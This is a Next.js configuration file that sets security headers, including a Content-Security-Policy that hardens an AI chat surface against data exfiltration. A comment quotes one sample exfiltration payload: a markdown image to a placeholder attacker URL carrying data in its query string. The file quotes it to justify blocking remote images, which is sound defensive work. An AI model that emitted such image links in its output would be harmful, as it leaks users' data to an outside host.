import { join } from 'node:path';
import type { NextConfig } from 'next';

/**
 * The BFF is reached same-origin via a rewrite so that auth cookies stay
 * first-party and the browser never talks to the BFF host directly.
 * In production this is fronted by CloudFront routing instead.
 */
const bffUrl = process.env.BFF_URL ?? 'http://localhost:4000';

/**
 * The ISOLATED VAULT ORIGIN (M15, docs/03 TB6).
 *
 * Needed here for ONE directive: `form-action`. Opening the vault is a
 * top-level form POST from this origin to that one — the shape that keeps the
 * single-use handoff code out of the URL, out of history and out of any
 * intermediary's access log — and `form-action 'self'` alone would have the
 * browser refuse it.
 *
 * BUILD TIME, like BFF_URL, because `headers()` is serialised into the routes
 * manifest exactly as `rewrites()` is. That is the M8 PR5 defect's shape, so it
 * is stated rather than discovered: the container build passes this arg, and
 * `compose-parity.spec.ts` asserts the value matches the one the BFF hands the
 * browser at runtime. If the two ever disagree the symptom is a refused form
 * post, not a silent downgrade.
 */
const vaultOrigin = process.env.VAULT_ORIGIN ?? 'http://vault.localhost:3010';

/**
 * The ISOLATED OPERATOR ORIGIN (M21 PR3a, docs/03 TB7). A SECOND destination for
 * exactly the same reason as the vault's: `/operator` hands a platform operator
 * over by top-level form POST, and `form-action` must name that origin or the
 * browser refuses the submission.
 *
 * BUILD TIME, like the vault's and like BFF_URL — `headers()` is serialised into
 * the routes manifest exactly as `rewrites()` is, which is the M8 PR5 defect's
 * shape. `compose-parity.spec.ts` asserts this value matches the one the BFF
 * hands the browser at runtime, so a disagreement is a refused form post rather
 * than a silent downgrade.
 */
const operatorOrigin = process.env.OPERATOR_ORIGIN ?? 'http://operator.localhost:3011';

/**
 * Content-Security-Policy, added with the conversation surface (M11) as DEFENCE
 * IN DEPTH BEHIND THE RENDERER, not instead of it.
 *
 * `MessageText` already renders model output as plain text, so no `<img>` or
 * `<a>` exists to point anywhere. This is the second line: `img-src 'self'
 * data:` means the BROWSER refuses a remote image load even if a future
 * renderer regresses, which closes docs/03 §6d's exfiltration channel
 * (`![](https://attacker/?d=…)` turning the victim's browser into the outbound
 * request) at a layer no component edit can reopen. `connect-src 'self'` keeps
 * fetch/XHR/WebSocket on this origin, and `form-action 'self'` stops a
 * submitted form leaving it.
 *
 * WHAT THIS DELIBERATELY DOES NOT DO, stated so nobody reads it as a full CSP:
 * `script-src` allows inline, because Next's hydration bootstrap and the
 * theme-flash script in `app/layout.tsx` are inline, and locking them down needs
 * per-request nonces threaded through middleware. That is its own change with
 * its own testing; claiming it here by writing a stricter directive that then
 * gets relaxed under pressure would be worse than saying plainly that it is not
 * done. The directives below are the ones that cost nothing today and close the
 * channel this milestone opened.
 */
const csp = [
  "default-src 'self'",
  // The exfiltration channel docs/03 §6d names. `data:` stays for inline SVG
  // and the vendored fonts' fallbacks; it cannot reach the network.
  "img-src 'self' data:",
  "connect-src 'self'",
  "font-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  /*
   * See the note above: NOT locked down, and deliberately not pretending to be.
   *
   * `'unsafe-eval'` is DEVELOPMENT ONLY (M11 security review). It shipped in
   * every environment on the first pass while the rationale above justified
   * only inline hydration — a directive nobody had explained, which is how a
   * relaxation outlives its reason. React Refresh needs it under `next dev`;
   * a production build does not, so production does not get it. `'unsafe-inline'
   * remains everywhere and is explained above.
   */
  process.env.NODE_ENV === 'production'
    ? "script-src 'self' 'unsafe-inline'"
    : "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "frame-ancestors 'none'",
  // 'self' plus exactly the two isolated origins — not a wildcard, and not the
  // whole scheme. These are the only cross-origin destinations any form in this
  // app is permitted to reach, and each one is there because a handoff ceremony
  // posts to it.
  `form-action 'self' ${vaultOrigin} ${operatorOrigin}`,
  "base-uri 'self'",
  "object-src 'none'",
].join('; ');

const securityHeaders = [
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Content-Security-Policy', value: csp },
];

/**
 * `output: 'standalone'` emits a self-contained server bundle with only the
 * traced runtime dependencies — exactly what the container should ship (no pnpm
 * store, no workspace symlinks, no dev dependencies).
 *
 * It is opt-in via NEXT_STANDALONE because producing it CREATES SYMLINKS, and
 * Windows refuses those without Developer Mode or elevation (EPERM), which would
 * break `pnpm build` on the maintainer's workstation. The container build (Linux)
 * sets the flag; everyday local builds and `pnpm build` in CI do not.
 */
const standalone =
  process.env.NEXT_STANDALONE === '1'
    ? {
        output: 'standalone' as const,
        // The traced root must be the workspace root, or Next resolves the
        // monorepo's hoisted dependencies outside the app directory and omits
        // them. Turborepo runs this task with the package as cwd.
        outputFileTracingRoot: join(process.cwd(), '..', '..'),
      }
    : {};

const nextConfig: NextConfig = {
  reactStrictMode: true,
  poweredByHeader: false,
  ...standalone,
  // Linting runs from the repo root flat config (`pnpm exec eslint apps/web`);
  // next build must not require a separate eslint-config-next setup.
  eslint: { ignoreDuringBuilds: true },
  rewrites() {
    return Promise.resolve([{ source: '/graphql', destination: `${bffUrl}/graphql` }]);
  },
  headers() {
    return Promise.resolve([{ source: '/:path*', headers: securityHeaders }]);
  },
};

export default nextConfig;
